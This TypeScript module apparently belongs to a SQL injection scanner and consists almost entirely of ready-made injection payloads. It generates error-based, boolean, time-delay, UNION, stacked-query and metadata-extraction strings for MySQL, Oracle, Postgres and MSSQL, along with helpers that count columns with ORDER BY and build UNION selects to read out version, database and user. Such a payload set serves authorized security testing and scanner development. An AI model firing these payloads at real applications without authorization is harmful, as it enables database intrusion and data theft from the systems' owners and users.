export type PayloadCategory = 'error' | 'boolean' | 'time' | 'union' | 'stacked' | 'meta';

export type PayloadDb = 'generic' | 'mysql' | 'oracle' | 'postgres' | 'mssql';

export interface Payload {
  id: string;
  category: PayloadCategory;
  value: string;
  db: PayloadDb;
}

export function generateErrorPayloads(): Payload[] {
  return [
    { id: 'err-single-quote', category: 'error', db: 'generic', value: `1'` },
    { id: 'err-string-quote', category: 'error', db: 'generic', value: `a' AND 1=1-- ` },
    { id: 'err-type-conversion', category: 'error', db: 'mysql', value: `1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x3a,(SELECT (ELT(1,1))),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)` },
    { id: 'err-oracle-unclosed', category: 'error', db: 'oracle', value: `1' AND 1=1--` },
  ];
}

export function generateBooleanPayloads(): { truthy: Payload; falsy: Payload } {
  return {
    truthy: { id: 'bool-true', category: 'boolean', db: 'generic', value: `1' OR '1'='1` },
    falsy: { id: 'bool-false', category: 'boolean', db: 'generic', value: `1' AND '1'='2` },
  };
}

export function generateTimePayloads(): Payload[] {
  return [
    { id: 'time-mysql', category: 'time', db: 'mysql', value: `1' AND SLEEP(3)-- ` },
    { id: 'time-postgres', category: 'time', db: 'postgres', value: `1' AND pg_sleep(3)-- ` },
    { id: 'time-mssql', category: 'time', db: 'mssql', value: `1'; WAITFOR DELAY '0:0:3'-- ` },
  ];
}

/** UNION 探测：NULL 探测 + 固定列数匹配（动态列数由 scanner 用 orderByPayload 探测后构造） */
export function generateUnionPayloads(): Payload[] {
  return [
    { id: 'union-null-1', category: 'union', db: 'generic', value: `1' UNION SELECT NULL-- ` },
    { id: 'union-columns-3', category: 'union', db: 'generic', value: `1' UNION SELECT 1,2,3-- ` },
  ];
}

/** 堆叠注入探测（多语句执行） */
export function generateStackedPayloads(): Payload[] {
  return [
    { id: 'stacked-select', category: 'stacked', db: 'generic', value: `1'; SELECT 1-- ` },
    { id: 'stacked-comment', category: 'stacked', db: 'mysql', value: `1'; /*!SELECT*/ 1-- ` },
  ];
}

/** 元信息查询片段（拼入注入点，用于提取 version/database/user） */
export function generateMetaPayloads(): Payload[] {
  return [
    { id: 'meta-version', category: 'meta', db: 'generic', value: `(SELECT version())` },
    { id: 'meta-database', category: 'meta', db: 'generic', value: `(SELECT database())` },
    { id: 'meta-user', category: 'meta', db: 'generic', value: `(SELECT current_user())` },
  ];
}

/** 列数探测：ORDER BY N，N 递增到报错临界点即为列数 */
export function orderByPayload(n: number): Payload {
  return { id: `union-orderby-${n}`, category: 'union', db: 'generic', value: `1' ORDER BY ${n}-- ` };
}

/** UNION 列匹配 payload（N 列，第 pos 列回显） */
export function unionSelectPayload(n: number, pos: number): Payload {
  const cols = Array.from({ length: n }, (_, i) => (i === pos - 1 ? `0x5641554c4e` : '1')).join(',');
  return { id: `union-select-${n}-${pos}`, category: 'union', db: 'generic', value: `1' UNION SELECT ${cols}-- ` };
}

export function generatePayloads(): Payload[] {
  const bools = generateBooleanPayloads();
  return [...generateErrorPayloads(), bools.truthy, bools.falsy, ...generateTimePayloads()];
}
